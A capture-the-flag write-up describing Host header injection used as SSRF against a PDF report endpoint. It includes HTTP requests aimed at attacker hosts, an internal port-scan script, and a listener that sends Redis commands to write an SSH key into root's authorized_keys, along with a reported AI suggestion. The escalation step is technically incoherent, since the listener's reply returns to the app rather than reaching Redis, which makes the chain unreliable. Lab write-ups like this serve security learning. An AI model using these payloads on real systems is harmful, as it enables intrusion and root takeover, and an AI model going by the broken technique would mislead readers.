## The Challenge

The challenge presented a simple web application with a login form. The frontend was unremarkable — no obvious SQL injection, no XSS, no typical web vulns. But the server had a peculiar feature: it generated "personalized" PDF reports for each user, and the report generator made an internal HTTP request to construct the report. The goal: get code execution on the server.

The title hints at the vulnerability: **Host header injection**. The server trusted the `Host` header from incoming requests and used it to construct internal URLs — a classic server-side request forgery (SSRF) vector that can escalate to code execution under the right conditions.

## Reconnaissance

### Step 1 — Map the application

I browsed the site and identified the endpoints:
- `/` — login form
- `/dashboard` — user dashboard (after login)
- `/report` — generates a PDF report, makes an internal request

### Step 2 — Identify the SSRF

The `/report` endpoint took a `?format=pdf` parameter and returned a PDF. I intercepted the request in Burp Suite and noticed the response included a footer: "Generated by http://ctf-app.internal:8080/report/render".

The server was making an internal HTTP request to itself, and the hostname (`ctf-app.internal`) was **derived from the incoming request's `Host` header**. I confirmed by changing the Host header:

```http
GET /report?format=pdf HTTP/1.1
Host: evil.attacker.com
```

The response footer changed to "Generated by http://evil.attacker.com:8080/report/render". The server was blindly trusting the Host header.

### Step 3 — Exploit the SSRF

I set up a listener on my attacker machine and pointed the Host header at it:

```http
GET /report?format=pdf HTTP/1.1
Host: my-attacker-ip:9999
```

On my listener:
```bash
$ nc -lvp 9999
Connection from [ctf-server-ip] ...
GET /report/render HTTP/1.1
Host: my-attacker-ip:9999
```

The server made an HTTP request to my machine. Classic SSRF confirmed.

## Escalation: SSRF to Code Execution

SSRF alone gives me internal network access, but not code execution. To escalate, I needed to find an internal service that would execute code based on the request.

### Step 4 — Port scanning the internal network

Using the SSRF, I scanned internal ports by pointing the Host header at `127.0.0.1:PORT` for various ports:

```python
import requests

for port in range(1, 10000):
    r = requests.get('http://ctf-app.example.com/report?format=pdf',
                     headers={'Host': f'127.0.0.1:{port}'})
    if 'Connection refused' not in r.text and 'Generated by' in r.text:
        print(f"Port {port}: OPEN")
```

I found:
- Port 8080 — the app itself
- Port 6379 — **Redis** (unauthenticated!)
- Port 9000 — PHP-FPM

### Step 5 — Redis to RCE

Redis was unauthenticated and running as root. I used the SSRF to send Redis commands via the HTTP request. The trick: Redis is lenient about HTTP — it ignores the HTTP headers and processes the body as Redis commands.

I set up a listener that would respond to the SSRF's HTTP request with Redis commands:

```python
# attacker_listener.py
import socket
s = socket.socket()
s.bind(('0.0.0.0', 9999))
s.listen(1)
conn, _ = s.accept()
# Ignore the HTTP request
conn.recv(4096)
# Send Redis commands to write an SSH key
payload = (
    "FLUSHALL\r\n"
    "CONFIG SET dir /root/.ssh/\r\n"
    "CONFIG SET dbfilename authorized_keys\r\n"
    f"SET x '\\nssh-rsa AAAA...my-ssh-pub-key... user@attacker\\n'\r\n"
    "SAVE\r\n"
)
conn.send(payload.encode())
```

Then I triggered the SSRF:
```http
GET /report?format=pdf HTTP/1.1
Host: my-attacker-ip:9999
```

Redis executed the commands, wrote my SSH public key to `/root/.ssh/authorized_keys`, and I could SSH in:
```bash
$ ssh root@ctf-server-ip
root@ctf:~# cat flag.txt
flag{h0st_h34d3r_1nj3ct10n_t0_rc3}
```

## The AI Assistance (Title Explanation)

The title mentions "AI helped me." Here's how: I was stuck on the escalation from SSRF to RCE. I had identified the internal Redis but didn't realize Redis would process HTTP-wrapped commands. I described the situation to an AI assistant, which pointed out that Redis's protocol parser ignores lines that don't start with a valid Redis command — including HTTP request lines. This meant I could send Redis commands as the body of an HTTP response, and Redis would execute them.

This is a well-known technique (documented in SSRF-to-Redis exploitation guides), but I hadn't encountered it before. The AI's suggestion saved me hours of trial-and-error.

## Takeaways

- **Trust no header.** The `Host`, `X-Forwarded-For`, `X-Forwarded-Host`, and `Referer` headers are all attacker-controlled. If the server uses them to construct URLs or make decisions, it's vulnerable. Always validate and sanitize.
- **SSRF is a gateway, not the destination.** SSRF alone gives you internal network access. The value is in what you find internally — Redis, internal APIs, cloud metadata endpoints (169.254.169.254), admin panels. Always scan the internal network after getting SSRF.
- **Redis is a common SSRF target.** Unauthenticated Redis is a one-way trip to RCE via the `authorized_keys` write or the crontab write. The HTTP-wrapping technique (Redis ignores HTTP headers) is the key.
- **Use AI for technique discovery, not for writing exploits.** AI is good at suggesting "have you tried X technique?" — less good at writing reliable exploit code. I use it as a brainstorming partner, then implement the technique myself.
